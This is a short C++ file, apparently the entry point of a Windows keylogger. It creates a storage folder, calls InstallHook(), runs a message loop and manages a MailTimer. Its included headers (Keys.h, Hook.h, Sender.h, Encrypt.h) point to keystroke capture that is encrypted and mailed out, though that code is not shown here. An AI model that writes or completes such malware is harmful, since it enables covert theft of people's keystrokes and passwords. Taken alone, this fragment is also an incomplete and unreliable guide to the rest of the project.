#include <iostream>
#include <windows.h>
#include "Encrypt.h"
#include "General.h"
#include "Keys.h"
#include "IO.h"
#include "Timer.h"
#include "Sender.h"
#include "Hook.h"



int main()
{
    MSG Msg;
    IO::MkDir(IO::GetOurPath(true));

    InstallHook();
    while(GetMessage (&Msg, NULL,0, 0))
    {
       TranslateMessage(&Msg);
       DispatchMessage(&Msg);
    }

    MailTimer.StopTimer();

    return 0;

}
